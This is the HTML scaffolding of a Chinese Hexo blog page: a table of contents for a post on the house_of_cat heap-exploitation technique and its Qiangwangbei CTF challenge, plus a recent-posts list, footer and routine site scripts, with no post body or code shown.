<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-text">house_of_cat学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D"><span class="toc-text">攻击介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%9Ahouse-of-cat"><span class="toc-text">强网杯：house_of_cat</span></a></li></ol></li></ol>
</div>
            </main>
            <aside class="right-column">
              <div class="sticky-widescreen">
  
  
    <article class="card card-content toc-card">
      <div class="toc-header">
  <i 
    class="iconfont icon-menu" 
    style="padding-right: 2px;">
  </i>TOC
</div>
<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-cat%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-text">house_of_cat学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D"><span class="toc-text">攻击介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%9Ahouse-of-cat"><span class="toc-text">强网杯：house_of_cat</span></a></li></ol></li></ol>
    </article>
  
  
  <article class="card card-content">
    <div class="recent-posts-card">
  <div class="recent-posts-header">
    <i 
      class="iconfont icon-wenzhang_huaban" 
      style="padding-right: 2px;">
    </i>Recent Posts
  </div>
  <div class="recent-posts-list">
    
      <div class="recent-posts-item">
        <div class="recent-posts-item-title">2022-09-14</div>
        <a href="/2022/09/14/house-of-cat/"><div class="recent-posts-item-content">house_of_cat</div></a>
      </div>
    
      <div class="recent-posts-item">
        <div class="recent-posts-item-title">2022-09-12</div>
        <a href="/2022/09/12/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF/"><div class="recent-posts-item-content">周报模板</div></a>
      </div>
    
      <div class="recent-posts-item">
        <div class="recent-posts-item-title">2022-09-07</div>
        <a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/"><div class="recent-posts-item-content">io_file利用</div></a>
      </div>
    
      <div class="recent-posts-item">
        <div class="recent-posts-item-title">2022-09-04</div>
        <a href="/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/"><div class="recent-posts-item-content">awd_pwn总结</div></a>
      </div>
    
  </div>
</div>
  </article>
  
  
</div>
            </aside>
          </div>
        </div>
      </div>
    </div>
     
    <footer class="footer">
  <div class="footer-container">
    <div>
      <div class="footer-dsc">
        <span>
          Copyright ©
          
            2020
          
          
                - 
                2022
          
        </span>
        &nbsp;
        <a 
          href="/" 
          class="footer-link">
          幽林
        </a>
      </div>
    </div>

    
      <div class="footer-dsc">
        
          Powered by
          <a 
            href="https://hexo.io/" 
            class="footer-link" 
            target="_blank" 
            rel="nofollow noopener noreferrer">
            &nbsp;Hexo
          </a>
        
        
          <span>&nbsp;|&nbsp;</span>
        
        
          Theme -
          <a 
            href="https://github.com/theme-kaze" 
            class="footer-link" 
            target="_blank"
            rel="nofollow noopener noreferrer">
            &nbsp;Kaze
          </a>
        
      </div>
    
    
    
    
</footer>
 
    
  <a 
    role="button" 
    id="scrollbutton" 
    class="basebutton" 
    aria-label="回到顶部">
    <i class="iconfont icon-arrowleft button-icon"></i>
  </a>

<a 
  role="button" 
  id="menubutton"
  aria-label="menu button"
  class="basebutton">
  <i class="iconfont icon-menu button-icon"></i>
</a>
<a 
  role="button" 
  id="popbutton" 
  class="basebutton" 
  aria-label="控制中心">
  <i class="iconfont icon-expand button-icon"></i>
</a>
<a 
  role="button" 
  id="darkbutton" 
  class="basebutton darkwidget" 
  aria-label="夜色模式">
  <i class="iconfont icon-weather button-icon"></i>
</a>
<a 
  role="button" 
  id="searchbutton" 
  class="basebutton searchwidget" 
  aria-label="搜索">
  <i class="iconfont icon-search button-icon"></i>
</a> 
     
     
     
      <script>
  var addImgLayout = function () {
    var img = document.querySelectorAll('.post-content img')
    var i
    for (i = 0; i < img.length; i++) {
      var wrapper = document.createElement('a')
      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
      wrapper.setAttribute('aria-label', 'illustration')
      wrapper.style.cssText =
        'width: 100%; display: flex; justify-content: center;'
      if (img[i].alt) wrapper.dataset.caption = img[i].alt
      wrapper.dataset.nolink = true
      img[i].before(wrapper)
      wrapper.append(img[i])
      var divWrap = document.createElement('div')
      divWrap.classList.add('gallery')
      wrapper.before(divWrap)
      divWrap.append(wrapper)
    }
    baguetteBox.run('.gallery')
  }
</script>
<script>
  loadScript(
    "/js/lib/lightbox/baguetteBox.min.js",
    addImgLayout
  )
</script>
 
     
     
    <script src="/js/main.js"></script> 
     
    
      <script>
        var addLazyload = function () {
          var observer = lozad('.lozad', {
            load: function (el) {
              el.srcset = el.getAttribute('data-src')
            },
            loaded: function (el) {
              el.classList.add('loaded')
            },
          })
          observer.observe()
        }
      </script>
      <script>
        loadScript('/js/lib/lozad.min.js', addLazyload)
      </script>
    
    <script src="//instant.page/5.1.0" type="module"
      integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>
    
    
  </body>
</html>
